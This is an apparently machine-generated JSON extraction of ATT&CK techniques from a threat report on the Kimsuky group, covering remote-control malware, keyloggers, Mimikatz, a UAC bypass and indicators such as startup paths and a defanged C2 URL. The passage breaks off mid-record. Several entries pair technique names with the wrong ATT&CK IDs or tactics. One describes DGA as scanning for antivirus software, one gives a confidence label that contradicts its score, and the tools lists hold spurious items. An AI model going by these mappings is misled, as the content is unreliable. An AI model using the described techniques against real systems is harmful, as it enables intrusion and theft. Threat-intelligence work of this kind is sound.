{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 66,
      "langchain_extractions": 1,
      "high_confidence_ttps": 1,
      "processing_time_ms": 19521.958000000002
    },
    "extraction_results": [
      {
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "extracted_ttps": [
          {
            "ttp_id": "fc54a1e5-59af-4588-901b-3997e5a3bba4",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Control Malware",
            "attack_id": "T1219",
            "tactic": "Persistence",
            "description": "The Kimsuky group installs remote control malware to control the infected system after completing initial access steps. Malware used by the Kimsuky group includes custom-made malware such as AppleSeed and PebbleDash, as well as open-source or commercial malware such as XRat, HVNC, Amadey, and Metasploit Meterpreter.",
            "confidence_score": 0.809,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.668,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "remote control malware",
              "XRat",
              "HVNC",
              "Amadey",
              "Metasploit Meterpreter"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "Metasploit",
              "sc",
              "zip",
              "HVNC",
              "XRat",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit Meterpreter"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7a75405c-9f97-43b1-84ad-591b938f9a49",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Spear Phishing Attack",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The Kimsuky group employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations.",
            "confidence_score": 0.78,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.556,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "spear phishing emails",
              "LNK shortcut-type malware",
              "compressed files"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c1716a04-7cb9-439f-ad50-82e61db3c199",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "LNK Malware",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The LNK file contains an encrypted compressed file, which in turn holds various malware in script format. Executing the LNK file decompresses the file, and ultimately, the script malware is run.",
            "confidence_score": 0.779,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.548,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "LNK files",
              "encrypted compressed files",
              "script malware"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "LNK malware",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d381f505-4a3f-4776-acb7-cbceff5956bd",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "There is also a script for maintaining persistence as well as a downloader that downloads and executes additional payloads from an external source.",
            "confidence_score": 0.764,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.484,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "persistence script",
              "downloader"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "persistence script",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "downloader",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "13b36b22-f66c-4121-b8c1-721cc1be5746",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The threat actor used proxy malware to establish an RDP connection to a private network",
            "confidence_score": 0.749,
            "confidence_level": "very_low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svc.exe",
              "setting.ini",
              "3389"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "Proxy",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9b7884b7-8c7f-4271-acbc-94097f14ffd6",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "Amadey malware creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\Startup' path to maintain persistence",
            "confidence_score": 0.739,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svc.vbs",
              "%ALLUSERSPROFILE%\\Startup"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d90b9844-5056-4c6b-a24a-f954cb5ac8ad",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Control Malware",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Kimsuky Group uses remote control malware (RftRAT, Amadey) for command and control",
            "confidence_score": 0.732,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RftRAT",
              "Amadey"
            ],
            "tools": [
              "RftRAT",
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "59303722-1c26-434a-95bb-594b9e71721f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "The keylogger persists in the system and monitors key input from the user",
            "confidence_score": 0.73,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\startup\\NsiService.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "003ae8fb-ec81-462a-a33f-459447009e4b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Code Obfuscation",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The loader reads, decrypts, and injects the htsetting.ini file located in the same path. All ht.dll loaders identified so far were packed with VMP, and the decrypted binary contained the following strings used by the threat actor.",
            "confidence_score": 0.723,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.596,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VMP packing",
              "ht.dll",
              "htsetting.ini"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "19815082-d3f2-4113-89fc-43cc5c849c79",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Loader",
            "attack_id": "T1050",
            "tactic": "Defense Evasion",
            "description": "Kimsuky Group uses AutoIt to create malware (XRat loader)",
            "confidence_score": 0.722,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "XRat",
              "AutoIt"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "XRat",
              "PowerShell",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f464998b-63db-4f1f-af88-8da62c6a8589",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Amadey malware is executed through the Rundll32.exe process",
            "confidence_score": 0.718,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.222,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Rundll32.exe"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7bad04b0-55df-4a1d-b81d-4bf3e6c9a047",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Spear Phishing Attack",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Kimsuky Group uses spear phishing to gain initial access",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "phishing email"
            ],
            "tools": [
              "rundll32",
              "LNK Malware",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e25fffd8-d45e-4e53-b217-79f57abed0e9",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "UAC Bypass",
            "attack_id": "T1548.002",
            "tactic": "Privilege Escalation",
            "description": "RftRAT uses the ICMLuaUtil interface of the CMSTPLUACOM component to bypass UAC and execute itself as administrator",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ICMLuaUtil",
              "CMSTPLUACOM",
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8366ec61-9eb3-4893-b9a0-443570b3e3c9",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Detected use of AutoIt for potential malicious script execution",
            "confidence_score": 0.714,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "autoit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d535e747-4fcb-4f63-aad9-0dccc51be158",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Scripting",
            "attack_id": "T1064",
            "tactic": "Execution",
            "description": "The BAT and VBS scripts inside can either be used for executing other scripts or contain an Infostealer responsible for collecting and exfiltrating information from the infected system.",
            "confidence_score": 0.713,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.524,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BAT scripts",
              "VBS scripts",
              "Infostealer"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "BAT",
              "sc",
              "VBS",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "801c2cec-64bc-4ae9-9cfe-073ee39c118c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Use of Known Utilities",
            "attack_id": "T1207",
            "tactic": "Execution",
            "description": "The Kimsuky group uses a dropper to install Amadey. Amadey is a malware that began being sold on illegal forums. It is a downloader that installs additional malware from the C&C server.",
            "confidence_score": 0.711,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.556,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Amadey",
              "dropper"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3038f110-af85-4b9c-bb3d-8913b5c0ee48",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "AutoIt",
            "attack_id": "T1562.004",
            "tactic": "Execution",
            "description": "Kimsuky group used AutoIt to create malware and inject RftRAT",
            "confidence_score": 0.71,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5edabb76-550d-41aa-b8be-f24c5d4a0b3d",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Keylogger",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "Kimsuky Group uses keylogger to capture credentials",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogger"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5e3bfb36-7b01-4a14-bdf7-fce3286e955d",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Amadey malware is loaded and executed through the Rundll32.exe process, then injected into the iexplore.exe process",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Rundll32.exe",
              "iexplore.exe",
              "svchost.exe"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Rundll32.exe",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6bb52599-f1b6-468f-93b8-f2c2364fd936",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The Kimsuky group ultimately uses RDP or installs Google\u2019s Chrome Remote Desktop to exfiltrate information from the infected system.",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RDP",
              "Google\u2019s Chrome Remote Desktop"
            ],
            "tools": [
              "rundll32",
              "RDP",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit",
              "Google\u2019s Chrome Remote Desktop"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2d68ae5a-36b1-4e4e-82c4-f0be161cb123",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Domain Generation Algorithms",
            "attack_id": "T1583.003",
            "tactic": "Command and Control",
            "description": "Amadey uses Domain Generation Algorithms (DGA) to scan for antivirus software",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.29,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "DGA"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "af44da62-de82-4cb6-b693-bfed89866e96",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d3791107-b654-40eb-86f2-dc767d0e9c59",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "Threat actor installed a legitimate AutoIt executable file and a compiled AutoIt script in the infected system",
            "confidence_score": 0.681,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt executable"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "94877a6c-ee97-4ac4-a3d6-1123da9a7d7a",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "RftRAT instances were packed with VMP and contained the keyword \"RFTServer\" in the decrypted strings",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RFTServer",
              "VMP"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4b74adbe-8488-47a3-81ff-ac604026a2ec",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "RftRAT collects basic information about the infected system and sends it to the C&C server",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%APPDATA%\\asc\\t1.pb",
              "hxxps://prohomepage[.]net/index.php"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "afd57284-a0cf-44e7-aab0-8617a00447c8",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Keylogging",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "The keylogger is installed in the path %ALLUSERSPROFILE%\\startup\\NsiService.exe and monitors key input from the user",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%ALLUSERSPROFILE%\\startup\\NsiService.exe",
              "%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "75a80b89-feab-4a56-bd38-44e17d6822ba",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Mimikatz",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Kimsuky Group uses Mimikatz to capture credentials",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Mimikatz"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ad5b5479-6570-45ca-9437-dcbf7d480676",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Rundll32",
            "attack_id": "T1085",
            "tactic": "Defense Evasion",
            "description": "Kimsuky Group uses Rundll32 to evade defenses",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "rundll32.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "17afcda8-7e27-4e19-a695-718d05e3eea7",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Command and Control",
            "description": "Amadey sends system information collected from the infected system to the C&C server using HTTP requests",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HTTP request"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0392ad94-9931-4055-af77-0117b16319b4",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Metasploit",
            "attack_id": "T1204",
            "tactic": "Exploitation for Client Execution",
            "description": "Kimsuky Group uses Metasploit for exploitation",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Metasploit"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "76e6827f-3578-42c3-a7fe-7f8ba8425f6f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "PowerShell",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Kimsuky Group uses PowerShell for execution",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
